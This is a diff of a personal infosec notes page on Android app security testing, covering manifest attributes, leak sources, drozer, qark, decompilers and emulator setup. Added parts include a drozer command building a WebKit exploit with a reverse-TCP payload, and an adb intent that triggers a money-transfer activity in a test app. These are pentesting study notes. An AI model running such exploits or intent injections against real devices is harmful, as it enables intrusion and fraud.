@@ -1,7 +1,7 @@
 ---
 layout: page
 
-title: Android security
+title: Android-security
 
 category: infosec
 see_my_category_in_header: true
@@ -24,7 +24,7 @@ permalink: /infosec/android-security.html
 
 * [Best Practices for Security &amp; Privacy](https://developer.android.com/training/best-security.html) - google cheatsheet
 * [Google security tips](https://developer.android.com/training/articles/security-tips.html)
-* [OWASP mobile security](https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks)
+* [OWASP mobile security - Top 10](https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks)
 
 <br>
 
@@ -158,10 +158,12 @@ Application:
 
 [Manifest specification](https://developer.android.com/guide/topics/manifest/manifest-intro.html)
 
+[API Google for android](https://developers.google.com/android/)
+
 - (api >= 1) ```<manifest>``` `android:installLocation` - *internalOnly* or *auto* or *preferExternal*
 - (api >= 1) ```<uses-sdk>``` - sets minimal, maximal and target sdk version
 - (api >= 1) ```<application android:debuggable="true" ...>``` - enables to attach to process with jdb (java debugger) and gives some privileges under process (run-as, etc.).
-<br>&#20;
+<br>&nbsp;
 
 - (api >= 23) ```<uses-permission-sdk-23>``` - Specifies that an app wants a particular permission, but only if the app is running on a device with API level 23 or higher.
 - (api >= 1) ```<permission android:name="com.example.project.DEBIT_ACCT" ... />``` - declaring the permission to get access to app
@@ -178,7 +180,7 @@ Application:
 - (api >= 4) ```<uses-feature>``` - declares types of hardware features smartphone must have (if `android:required="true"`) and better to have (if `android:required="false"`) (e.g. android.hardware.bluetooth)
 
 - (api >= 3) ```<uses-configuration>``` - indicates if it needs some types of hardware and software features.
-<br>&#20;
+<br>&nbsp;
 
 
 - (api >= 1) ```<service>``` - declares a service (a Service subclass) as one of the application's components. <br>
@@ -200,11 +202,11 @@ Application:
 
 
     ```<activity-alias>``` has attributes `enabled`, `exported` and `permission`.
-    <br>&#20;
+    <br>&nbsp;
 
 
 - ```<protected-broadcast android:name="...">``` - tells android os to allow this application get broadcast messages only from system.
-<br>&#20;
+<br>&nbsp;
 
 - (api >= 1) ```<intent-filter>``` - specifies the types of intents that an activity, service, or broadcast receiver can respond to. <br>
     
@@ -221,7 +223,7 @@ Application:
     - `android:multiprocess` - by default is *false*, meaning instance of the content provider will **not** be created in every client process
     - `android:permission`, `android:readPermission`, `android:writePermission` - the name of a permission that clients must have to read/write the content provider's data (last two takes precedence over the first one)
     - `android:syncable` - whether or not the data under the content provider's control is to be synchronized with data on a server — "true" if it is to be synchronized, and "false" if not.
-    <br>&#20;
+    <br>&nbsp;
 
     - `android:grantUriPermissions` - if "true", permission can be granted to any of the content provider's data <br>
         if `false`, enables access to resources described in ```<grant-uri-permission>```
@@ -319,7 +321,7 @@ Application:
 
 
 - application **android:debuggable** - enables to attach to process with jdb (java debugger) and gives some privileges under process (run-as, etc.).
-<br>&#20;
+<br>&nbsp;
 
 
 - **eval** equivalents in Android
@@ -339,6 +341,8 @@ Application:
 Information leaks:
 
 - **logcat** - developers could have not disabled logging - handy for app analysis
+
+    (android < 4.1 (api 16)) - logcat can be read by any application (after api 16 each application has its own log)
 
 - application WebView (can store sensitive data just like web browser)
 
@@ -422,6 +426,9 @@ SMS is **not encrypted** and **not authenticated** and can be intercepted, there
 
 ## Android security tools
 
+[Android Tamer](https://androidtamer.com/) - distributive for android security penetration testing
+<br> [Koodous](https://docs.koodous.com/) - platform for Android malware research (looks like infosec ecosystem)
+
 * [Xposed framework (4PDA)](http://4pda.ru/forum/index.php?showtopic=425052) - hooking framework
 * [Frida](http://www.frida.re/) - framework for javascript injections (not only android related)
 
@@ -432,18 +439,78 @@ SMS is **not encrypted** and **not authenticated** and can be intercepted, there
 
 <br>
 
-* [drozer](https://github.com/mwrlabs/drozer) - security testing framework for Android
-* [qark](https://github.com/linkedin/qark) - tool designed to look for several security related Android application vulnerabilities
+* [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) - Mobile Security Framework - an intelligent, all-in-one open source mobile application (Android/iOS/Windows) automated pen-testing framework capable of performing static, dynamic analysis and web API testing
+
+*   [drozer](https://github.com/mwrlabs/drozer) - ***awesome*** security testing framework for Android
+
+    Connecting:
+
+    ```
+    # 1. Generate agent application apk
+    $ drozer agent build
+    # 2. Launch an agent application on android device
+    # 3. Forward ports from avd to host
+    ./adb forward tcp:31415 tcp:31415
+    # 4. run drozer (e.g. console mode)
+    drozer console --server localhost:31415 connect
+    ```
+
+    General commands:
+
+    ```
+    dz> list # show all modules
+    dz> run app.package.list # list all packages
+    dz> run app.package.list -f test # grep list of packages
+    dz> shell # run shell
+    ```
+
+    First priority commands for application analysis:
+
+    ```
+    dz> run app.package.info -a test.app.sdk
+    dz> run app.package.attacksurface test.app.sdk
+    dz> run app.package.launchintent test.app.sdk
+    dz> run app.provider.info -a test.app.sdk
+    dz> run app.activity.info -a test.app.sdk
+    dz> run app.service.info -a test.app.sdk
+    dz> run app.broadcast.info -a test.app.sdk
+    ```
+
+    `Permission: null` - means no permissions needed to start activity/service/broadcast
+
+    Shellcode examples ([trivial example](http://mobiletools.mwrinfosecurity.com/Exploitation-features-in-drozer/)):
+
+    ```
+    $ drozer exploit list
+    $ drozer shellcode list
+    $ drozer exploit build exploit.remote.webkit.nanparse –-payload weasel.reverse_tcp.armeabi --server 10.0.2.2:31415 --push-server 127.0.0.1:31415 --resource /home.html
+    ```
+
+* [qark](https://github.com/linkedin/qark) - ***awesome*** tool designed to look for several security related Android application vulnerabilities
+
+Triggering intents ([`./adb shell am -h`](https://gist.github.com/tsohr/5711945)):
+
+* `./adb shell am start -a android.intent.action.VIEW -c android.intent.category.DEFAULT -e foo bar -e bert ernie -n my.package.component.blah` <br>
+    (in Java code extraction: `extras.getString("foo")`)
+* `./adb shell am start -n com.package.name/com.package.name.ActivityName` or `am start -a com.example.ACTION_NAME -n com.package.name/com.package.name.ActivityName`
+* `./adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -c android.intent.category.HOME -n net.fstab.checkit_android/.StartupReceiver`
 
 #### Android Emulators:
 
-* [Android studio + Android SDK](https://developer.android.com/studio/index.html#downloads)
+* [Android studio + Android SDK](https://developer.android.com/studio/index.html#downloads) (avd will be ***not*** rooted)
 * [Android x86 VM images for VMware and VirtualBox](http://www.osboxes.org/android-x86/)
-* [Genymotion](https://www.genymotion.com/)
+* [Genymotion](https://www.genymotion.com/) (avd ***will be*** rooted from the box)
+* Other emulators: [memu](http://www.memuplay.com/)
+
+Enable proxy for emulators:
+
+* settings -> wireless & networks -> More -> Cellular networks -> Access Point Names -> T-Mobile US -> `<change proxy:port>` -> upper right corner -> Save <br>
+    However this method sometimes doesn't work
+* `emulator -avd myavd -http-proxy http://168.192.1.2:3300`
 
 #### Download APK:
 
-* [Raccoon](https://github.com/onyxbits/Raccoon) - Google Play desktop client (allows to download android APK files)
+* [Raccoon](https://github.com/onyxbits/Raccoon) - Google Play desktop client (allows to download android APK files) (look into `~/Documents/Racoon`)
 * [APK online downloader](https://apkpure.com/)
 
 #### APK disassemble
@@ -461,6 +528,7 @@ SMS is **not encrypted** and **not authenticated** and can be intercepted, there
 * [jd-gui](https://github.com/java-decompiler/jd-gui/releases)
 * [cfr](http://www.benf.org/other/cfr/)
 * [jad](http://www.javadecompilers.com/jad)
+* [dex2jar](https://github.com/pxb1988/dex2jar/releases) - dex->jar
 * [jadx](https://github.com/skylot/jadx) - dex->java
 * [BytecodeViewer](https://github.com/Konloch/bytecode-viewer) - combined utility (has various backends)
 * [procyon](https://bitbucket.org/mstrobel/procyon/wiki/Java%20Decompiler)
@@ -469,6 +537,10 @@ SMS is **not encrypted** and **not authenticated** and can be intercepted, there
 * [Krakatau](https://github.com/Storyyeller/Krakatau/) (python required)
 
 #### Other tools:
+
+* [apk deguard](http://apk-deguard.com/) - statistical deobfuscation for android
+
+<br>
 
 * [Nocturne](https://github.com/LapisBlue/Nocturne) - a graphical tool for creation of Java deobfuscation mappings
 * [Android-SSL-TrustKiller](https://github.com/iSECPartners/Android-SSL-TrustKiller) - bypass SSL certificate pinning for most applications
@@ -482,17 +554,47 @@ SMS is **not encrypted** and **not authenticated** and can be intercepted, there
 
 * {:.dummy} list of other tools: [25 Awesome Android Reverse Engineering Tools - Mobile phones - Romanian Security Team](https://rstforums.com/forum/topic/102731-25-awesome-android-reverse-engineering-tools/)
 * {:.dummy} [ip-tools](https://4pda.ru/forum/index.php?showtopic=478753) - android-application for network analysis
+* {:.dummy} [Termux](https://play.google.com/store/apps/details?id=com.termux&hl=ru) - powerful terminal emulation with an extensive Linux package collection.
 
 ---
+
+<div class="spoiler"><div class="spoiler-title">
+    <i>Crib - connecting to remote android emulator</i>
+</div><div class="spoiler-text" markdown="1">
+
+*Follow this instructions **precisely** !!!*
+
+* on *host* machine with ip = `$REMOTE_IP` we start android emulator (port 5554)
+* we are connecting from some *guest* machine
+
+1. Make port forwarding on *guest*: `localhost:5554 -> $REMOTE_IP:5554` **and** `localhost:5555 -> $REMOTE_IP:5555` (because adb server will connect to `localhost`)
+1. Make port forwarding on *host*: `$REMOTE_IP:5554 -> 127.0.0.1:5554` **and** `$REMOTE_IP:5555 -> 127.0.0.1:5555` (because emulator listen `localhost:5554` but not `0.0.0.0:5554`)
+1. `./adb kill-server` on *host* machine ( -- not sure if this step is needed)
+1. Restart your avd device on *host* machine ( -- not sure if this step is needed)
+1. `./adb kill-server && ./adb connect $REMOTE_IP:5554 && ./adb devices` on *guest* machine
+
+    You must see available devices now. (also you can use instead of `$REMOTE_IP` `localhost` in `connect` command (because port forwarding works))
+
+</div>
+</div>
+
+<br>
 
 <div class="spoiler"><div class="spoiler-title">
     <i>Crib</i>
 </div><div class="spoiler-text" markdown="1">
 
+>   - cd android-sdk/tools
+>   - .\android.bat list avd
+>   - .\emulator.exe -avd nexus-5x-api24-google-api -http-proxy http://192.168.1.98:8080
+>   - cd android-sdk/platform-tools
+>   - .\adb.exe devices -l
+>   - .\adb -s 192.168.80.101:5555 shell
+>
 >   - adb shell dumpsys user
 >   - adb shell pm list users
 >   - adb shell am start -n com.example.nanisenya.snatch/.MoneyTransferActivity --es id 31 --es amount 1 --es receiver 80107430600227300031 --es description wow
-> <br>&#20;
+> <br>&nbsp;
 > 
 >  Rebuilding android apk
 >
